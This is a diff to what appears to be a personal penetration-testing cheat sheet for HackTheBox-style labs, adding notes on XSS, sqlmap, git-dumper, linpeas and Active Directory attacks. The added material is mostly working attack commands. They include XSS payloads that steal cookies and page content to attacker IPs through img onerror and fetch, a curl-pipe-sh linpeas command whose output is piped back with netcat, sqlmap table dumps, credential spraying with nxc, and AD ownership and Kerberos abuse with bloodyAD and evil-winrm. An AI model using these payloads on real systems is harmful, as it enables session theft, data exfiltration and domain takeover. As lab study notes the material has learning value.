@@ -85,6 +85,8 @@ curl 10.10.14.20:8000/linpeas.sh | sh | nc 10.10.14.20 9002 #Victim
 
 It's possible to get some data and return the result to a local socket.
 
+To encode as base 64 `btoa(document.cookie)` or to encode as URI Component : `encodeURIComponent(data)`.
+
 > use netcat and not python3 (can't deal with the POST)
 
 ```JavaScript
@@ -94,7 +96,7 @@ fetch('http://10.10.14.117:4444', {
 });
 ```
 
-You can also make an SSTI ?
+You can also make an SSRF
 
 ```JavaScript
 fetch('http://alert.htb/messages')
@@ -105,6 +107,20 @@ fetch('http://alert.htb/messages')
       body: data,
     });
   });
+```
+
+### Admin cookies
+
+With the following payload, once the error occurs, it tries to use an image (GET) on the server with the cookies as a ressource.
+
+```http
+<img src=x onerror=this.src="http://10.10.14.220:8000/"+btoa(document.cookie)>
+```
+
+Sometimes, the image, don't work, you'll have to rely on a link, hopping it will be clicked :
+
+```http
+<a href="javascript:fetch('http://localhost:3000/administrator/Employee-management/').then(response => response.text()).then(data => fetch('http://10.10.14.101:8000?data='+encodeURIComponent(data)))">Click me</a>
 ```
 
 ### Burpsuite
@@ -130,7 +146,47 @@ Attack type :
 
 Tab Options : `grep payloads` to show only a part of the answer. `grep extract` a tester également, faire les pros and cons
 
+### sqlmap
+
+Sqlmap is a tool to exploit SQL vulnerabilities.
+
+We ue this first command to find if the page is injectable. We specify the cookies and the data sent to the form. With `-p`, we specify the parameter to try. The `--dbms` is for the type of DDB
+
+```bash
+sqlmap -u http://$TARGET/accept_cat.php --cookie="PHPSESSID=99mqrq482ubk7bcg2sgmogf35v" --data="catName=bello&catId=1" -p catName --dbms=sqlite --level=5 --risk=3
+```
+
+With this command, you can dump the content of a table : `--dump`, the table is specified with `-T "users"` and using a boolean based injection `--technique=B`.
+
+```bash
+sqlmap -u http://$TARGET/accept_cat.php --cookie="PHPSESSID=99mqrq482ubk7bcg2sgmogf35v" --data="catName=bello&catId=1" -p catName --dbms=sqlite --level=5 --risk=3 --technique=B -T "users" --threads=7 --dump
+```
+
+### Git-Dumper
+
+With this few commands, you can restore data from the commits.
+
+```bash
+git-dumper.sh http://$TARGET/.git ./git-dump/
+# Then restore the data from the commits info
+cd git-dump
+git reset --hard HEAD
+```
+
 </details>
+
+## Linpeas
+
+### Usage send and back
+
+```bash
+# Host on two sparate terminal
+python3 -m http.server 8000
+nc -lvnp 9002 | tee linpeas.out
+
+# Victim
+curl 10.10.14.20:8000/linpeas.sh | sh | nc 10.10.14.20 9002
+```
 
 ## Active Directory
 
@@ -151,6 +207,24 @@ ldapsearch -x -H ldap://"$DC_HOST" -D "$USER"@"$DOMAIN" -w "$PASSWORD" -b "DC=VI
 ```
 
 The `-x` is for the 'simple authentication', used in combinaison of the -D and the -w. The `-b` is the base search. Here, this limits the query to only objects under the domain. Then, you specify a filter, here you want all the `user` object. Then, you can filter for specific attributes. Here the unique logon of the user and the groups it belongs to.
+
+### Creds enumeration
+
+If you have access to a list of users and a list of passwords. The `--no-bruteforce` is used if you don't want to test each password for each user.
+
+```bash
+nxc smb "$TARGET" -u users.txt -p passwords.txt --continue-on-succes --no-bruteforce
+```
+
+### Permissions Delegations
+
+Can the user requeset ressources for(as) an other user and on which computer/service.
+
+```bash
+findDelegation.py -k -no-pass "$DOMAIN"/"$USER":"$PASSWORD" -dc-host "$DC_HOST"
+```
+
+#### To-DO : finir l explication
 
 ### Bloodhound
 
@@ -187,6 +261,12 @@ Add a user in a group
 ```bash
 bloodyAD --host "$DC_IP" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" add groupMember $TargetGroup $TargetUser
 [+] judith.mader added to Management
+```
+
+If you have `WriteOwner` :
+
+```bash
+bloodyAD --host "$DC_IP" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" set owner <OBJECT_DN> <NEW_OWNER>
 ```
 
 ### Shadow Credentials
@@ -253,6 +333,32 @@ certipy shadow auto -username management_svc@certified.htb -hashes a091c1832bcdd
 ```
 
 </details>
+
+### Evil-winrm with TGT
+
+Change the /etc/krb5.conf like this :
+
+```bash
+[libdefaults]
+  default_realm = VINTAGE.HTB
+  ticket_lifetime = 24h
+  renew_lifetime = 7d
+  forwardable = true
+
+[realms]
+  VINTAGE.HTB = {
+    kdc = dc01.vintage.htb
+    admin_server = dc01.vintage.htb
+  }
+
+[domain_realm]
+  .vintage.htb = VINTAGE.HTB
+  vintage.htb = VINTAGE.HTB
+```
+
+```bash
+KRB5CCNAME=./c.neri.ccache evil-winrm -i "$TARGET" -r "$DOMAIN"
+```
 
 ### Kebreoast
 
@@ -354,6 +460,18 @@ how do we know param_2(argv[1]) is at local_28.
 |    local_28        | <-- [RBP + 0x28] (local variables)
 |--------------------|
 ```
+
+## TP Secu IMT
+
+buffer
+ebr : données de remplissage, inutile ici
+eip : adresse suivante de la fonction (ce qui sera executé après)
+esp : adresse d execution en terinant la fonction
+
+=> il faut mettre autre chose dans eip, ici esp
+dans esp, nous pouvons mettre l adresse dans laquelle nous voulons continuer
+Tout simplement la suivante, qui contient
+
 </details>
 
 Rouge : pas dans la mémoire
